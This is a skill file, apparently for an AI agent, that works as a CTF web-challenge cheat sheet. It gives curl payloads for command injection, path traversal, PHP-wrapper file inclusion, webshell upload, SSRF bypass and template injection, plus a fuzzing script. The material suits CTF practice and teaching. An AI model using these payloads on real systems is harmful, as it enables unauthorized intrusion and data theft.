---
name: ctf-web
description: This skill should be used when solving CTF (Capture The Flag) web challenges. Triggers include: HTTP method manipulation, CORS exploits, request header forgery, cookie/session manipulation, SSRF, XSS, file inclusion, command injection, and web application vulnerabilities.
---

# CTF Web Security

## Overview

This skill provides systematic workflows for solving CTF web challenges. It covers HTTP manipulation, CORS exploits, authentication bypass, and common web vulnerabilities.

**Core principle**: Read the challenge description carefully -- the name and hints often directly tell you the vulnerability type.

---

## Quick Start Checklist

1. Read the challenge name and description for hints
2. Baseline: curl the URL, check response headers
3. Test different HTTP methods (GET/POST/OPTIONS/PUT/PATCH/DELETE)
4. Test common request headers (Origin, Referer, Cookie, Authorization)
5. Check source code and comments
6. Test URL parameters and query strings
7. Check for hidden paths (robots.txt, .git, .backup)
8. Test authentication bypass

---

## Category 1: HTTP Method Manipulation

### CORS "Simple Request" Trick

CORS specification defines "simple requests" as only allowing GET, POST, and HEAD methods. Non-simple methods trigger preflight (OPTIONS).

**Challenge pattern**: Server checks `$_SERVER['REQUEST_METHOD']` and returns flag for non-standard methods.

```bash
# Test all HTTP methods
URL="http://target/ctf/challenge.php"

for method in GET POST HEAD OPTIONS PUT DELETE PATCH TRACE; do
  echo "=== $method ==="
  curl -si -X "$method" "$URL"
  echo ""
done
```

### Common Method-Based Challenges

| Scenario | Expected Method | Example |
|----------|----------------|---------|
| "Simple request" hint | PATCH/PUT/DELETE | `curl -X PATCH url` |
| REST API challenge | PUT/PATCH | `curl -X PUT url -d 'flag=true'` |
| Admin endpoint | DELETE | `curl -X DELETE url/admin` |

---

## Category 2: Request Header Exploits

### Key Headers to Test

```bash
URL="http://target/challenge.php"

# Origin (CORS)
curl -si "$URL" -H "Origin: http://target"
curl -si "$URL" -H "Origin: null"
curl -si "$URL" -H "Origin: http://evil.com"

# Referer
curl -si "$URL" -H "Referer: http://target/"
curl -si "$URL" -H "Referer: https://google.com"

# Spoofed IP headers (SSRF bypass)
curl -si "$URL" -H "X-Forwarded-For: 127.0.0.1"
curl -si "$URL" -H "X-Real-IP: 127.0.0.1"
curl -si "$URL" -H "Client-IP: 127.0.0.1"
curl -si "$URL" -H "X-Client-IP: 127.0.0.1"
curl -si "$URL" -H "Forwarded: for=127.0.0.1"

# User-Agent
curl -si "$URL" -A "Mozilla/5.0"
curl -si "$URL" -A "Googlebot/2.1"
curl -si "$URL" -A "curl/7.68.0"

# Authorization
curl -si "$URL" -H "Authorization: Bearer token"
curl -si "$URL" -H "Authorization: Basic dGVzdDp0ZXN0"

# Custom headers
curl -si "$URL" -H "X-Requested-With: XMLHttpRequest"
curl -si "$URL" -H "X-Custom-Header: admin"
```

### Content-Type Tricks

```bash
# Non-simple content types (trigger CORS preflight)
curl -si -X POST "$URL" -H "Content-Type: application/json" -d '{}'
curl -si -X POST "$URL" -H "Content-Type: application/xml" -d '<x/>'
curl -si -X POST "$URL" -H "Content-Type: text/plain" -d 'flag'
```

---

## Category 3: Cookie & Session Manipulation

```bash
# Test common cookie values
curl -si "$URL" -H "Cookie: admin=1"
curl -si "$URL" -H "Cookie: isadmin=1"
curl -si "$URL" -H "Cookie: flag=1"
curl -si "$URL" -H "Cookie: role=admin"
curl -si "$URL" -H "Cookie: user=admin"
curl -si "$URL" -H "Cookie: logged_in=true"

# Cookie modification with cookie jar
curl -si -c cookies.txt "$URL"     # Save cookies
# Edit cookies.txt manually, then:
curl -si -b cookies.txt "$URL"     # Replay modified cookies
```

### JWT Token Manipulation

```python
import base64, json, hmac, hashlib

# Decode JWT without verification
def decode_jwt(token):
    parts = token.split('.')
    for i, part in enumerate(parts[:2]):
        padded = part + '=' * (4 - len(part) % 4)
        print(f"Part {i}: {json.dumps(json.loads(base64.urlsafe_b64decode(padded)), indent=2)}")

# Common JWT attacks:
# 1. alg: "none" -> remove signature
# 2. Change payload (e.g., {"role": "admin"})
# 3. Weak signing key brute force
```

---

## Category 4: URL & Parameter Exploits

### Parameter Discovery

```bash
URL="http://target/challenge.php"

# Common parameter names
for param in flag admin debug id source show_source view-source highlight key password secret cmd file page lang action type; do
  echo "=== ?$param=1 ==="
  curl -s "$URL?$param=1"
  echo ""
done

# Boolean parameters
curl -s "$URL?flag=1"
curl -s "$URL?admin=true"
curl -s "$URL?debug=1"
curl -s "$URL?source=1"

# Path traversal
curl -s "$URL?file=../../../etc/passwd"
curl -s "$URL?page=....//....//....//etc/passwd"
```

### Path Discovery

```bash
TARGET="http://target"

# Common hidden paths
for path in robots.txt .git/HEAD .git/config .gitignore .env .htaccess \
  backup.sql dump.sql db.sql config.php.bak index.php.bak \
  phpinfo.php test.php admin/ login/ flag/ flag.txt \
  .well-known/ .DS_Store WEB-INF/web.xml; do
  resp=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/$path")
  if [ "$resp" != "404" ] && [ "$resp" != "000" ]; then
    echo "[${resp}] /$path"
  fi
done
```

---

## Category 5: Command Injection

```bash
# Basic command injection test
curl -s "$URL?ip=127.0.0.1;cat /flag"
curl -s "$URL?ip=127.0.0.1|cat /flag"
curl -s "$URL?ip=127.0.0.1\ncat /flag"
curl -s "$URL?ip=127.0.0.1&&cat /flag"
curl -s "$URL?ip=127.0.0.1%0acat%20/flag"

# Blind command injection (time-based)
curl -s "$URL?ip=127.0.0.1;sleep 3"
curl -s "$URL?ip=127.0.0.1|sleep 3"
```

### POST-based Injection

```bash
curl -s -X POST "$URL" -d "cmd=cat /flag"
curl -s -X POST "$URL" -d "ip=127.0.0.1;cat /flag"
```

---

## Category 6: File Upload & Inclusion

### File Inclusion (LFI/RFI)

```bash
# Local File Inclusion
curl -s "$URL?page=php://filter/convert.base64-encode/resource=flag"
curl -s "$URL?file=php://filter/convert.base64-encode/resource=index"
curl -s "$URL?page=data://text/plain,<?php system('cat /flag');?>"

# PHP wrappers
curl -s "$URL?file=php://filter/convert.base64-encode/resource=index.php"
curl -s "$URL?file=php://input" -d "<?php system('id');?>"
curl -s "$URL?file=expect://id"
```

### File Upload Bypass

```bash
# Upload PHP webshell as image
curl -s -X POST "$URL" -F "file=@shell.php;type=image/jpeg"
curl -s -X POST "$URL" -F "file=@shell.php;type=image/png"
curl -s -X POST "$URL" -F "file=@shell.phtml"

# Common webshell filenames
# shell.php, shell.phtml, shell.php5, shell.php7, .htaccess
```

---

## Category 7: SSRF (Server-Side Request Forgery)

```bash
URL="http://target/fetch?url="

# Internal services
curl -s "$URL=http://127.0.0.1"
curl -s "$URL=http://localhost"
curl -s "$URL=http://0.0.0.0"
curl -s "$URL=http://[::1]"

# File protocol
curl -s "$URL=file:///etc/passwd"
curl -s "$URL=file:///flag"

# Bypass filters
curl -s "$URL=http://127.0.0.1#@evil.com"
curl -s "$URL=http://0x7f000001"
curl -s "$URL=http://2130706433"    # 127.0.0.1 in decimal
curl -s "$URL=http://0177.0.0.1"   # 127.0.0.1 in octal
```

---

## Category 8: SSTI (Server-Side Template Injection)

```bash
# Test payloads for common template engines
# Jinja2/Twig
curl -s "$URL?name={{7*7}}"                    # Expect 49
curl -s "$URL?name={{config}}"                  # Dump config
curl -s "$URL?name={{''.__class__.__mro__}}"    # Class exploration

# PHP
curl -s "$URL?name={${system('id')}}"

# Common detection strings
curl -s "$URL?input={{7*7}}"       # Jinja2
curl -s "$URL?input=${7*7}"        # Twig/Smarty
curl -s "$URL?input=#{7*7}"        # ERB
curl -s "$URL?input=<%=7*7%>"      # EJS
```

---

## Automated Fuzzing Script

```bash
#!/usr/bin/env bash
# Complete web challenge fuzzer
URL="$1"
OUT="web_fuzz_result.txt"
> "$OUT"

check() {
  local tag="$1" body
  body=$(curl -si "$@" 2>&1)
  echo "=== $tag ===" >> "$OUT"
  echo "$body" >> "$OUT"
  echo "" >> "$OUT"
  if echo "$body" | grep -qiE "flag\{|ctf\{|congrat|success"; then
    echo "🎉 HIT: $tag"
    return 0
  fi
  return 1
}

# Methods
for m in GET POST HEAD OPTIONS PUT DELETE PATCH TRACE; do
  check "METHOD $m" -X "$m" "$URL"
done

# Headers
check "Origin self"       -H "Origin: $(echo $URL | sed 's|/[^/]*$||')" "$URL"
check "Origin null"       -H "Origin: null" "$URL"
check "X-Forwarded-For"   -H "X-Forwarded-For: 127.0.0.1" "$URL"
check "Authorization"     -H "Authorization: Bearer test" "$URL"
check "Cookie admin=1"    -H "Cookie: admin=1" "$URL"

# Parameters
for p in flag admin debug source show_source key id cmd file page; do
  check "PARAM $p=1" "$URL?$p=1"
done

# POST data
for d in "flag=1" "admin=1" "key=flag" "cmd=cat /flag"; do
  check "POST $d" -X POST -d "$d" "$URL"
done

echo "Full results: $OUT"
```

---

## Real Cases

### Case 1: "Simple Request" (HTTP Method)

**Challenge**: `2.php` -- "Not this time. Refresh and try your luck!"
**Flag**: `flag{you_win_the_lottery_!}`

**Solution**: Challenge name "简单请求" hints at CORS simple request concept. Simple requests only allow GET/POST/HEAD. Using `PATCH` method returns the flag.

```bash
curl -si -X PATCH "http://target/ctf/2.php"
```

**Key lesson**: HTTP methods are trivially spoofable by clients. Never use them for security.

---

## Decision Tree

```
Start: Got a web challenge
  |
  +-- Check challenge name/description for hints
  |
  +-- Baseline GET request
  |     Different from expected? -> Analyze difference
  |     Same "try again" message? -> Check HTTP method
  |
  +-- Try non-standard methods (PUT/PATCH/DELETE/OPTIONS)
  |     Flag returned? -> DONE
  |
  +-- Try request header manipulation
  |     Origin, Referer, Cookie, X-Forwarded-For
  |     Flag returned? -> DONE
  |
  +-- Check URL parameters
  |     ?source, ?debug, ?file, ?flag
  |
  +-- Check for hidden paths
  |     robots.txt, .git/, .env, backup files
  |
  +-- Test for common vulnerabilities
        SQLi, XSS, SSTI, Command Injection, LFI, SSRF
```

---

## Tools Summary

| Tool | Purpose | Install |
|------|---------|---------|
| curl | HTTP requests | Usually pre-installed |
| burpsuite | HTTP proxy & repeater | Free download |
| sqlmap | SQL injection | pip install sqlmap |
| dirsearch | Directory brute force | pip install dirsearch |
| ffuf | Web fuzzer | GitHub release |
| nikto | Web vulnerability scanner | apt install nikto |
| gobuster | Directory scanner | apt install gobuster |
